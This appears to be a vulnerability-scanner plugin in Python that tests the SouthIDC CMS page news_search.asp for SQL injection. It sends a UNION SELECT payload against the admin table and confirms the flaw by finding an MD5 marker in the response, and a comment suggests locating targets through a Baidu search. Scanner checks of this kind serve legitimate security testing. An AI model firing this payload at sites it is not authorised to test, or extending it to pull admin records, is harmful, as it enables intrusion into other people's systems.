# !/usr/bin/dev python
# -*- coding:utf-8 -*-

import re
import hashlib
import time

"""
reference:
百度搜索southidc news_search
"""

def assign(service, arg):
    if service == 'southidc':
        return True, arg
    pass


def audit(arg):
    verify_url = arg + 'news_search.asp'
    payload = "?key=7%'%20union%20select%200,md5(3.14),2,3,4,5,6,7,8,9%20from%20admin%20where%201%20or'%'='&otype=title&Submit=%CD%D1%CB%F7"
    url = verify_url + payload
    code, head, res, _, _ = curl.curl(url)
    if code == 200:
        if '4beed3b9c4a886067de0e3a094246f78' in res:
            security_hole(url)
    pass


if __name__ == "__main__":
    from dummy import *
    audit(assign('southidc', 'http://www.example.com/')[1])
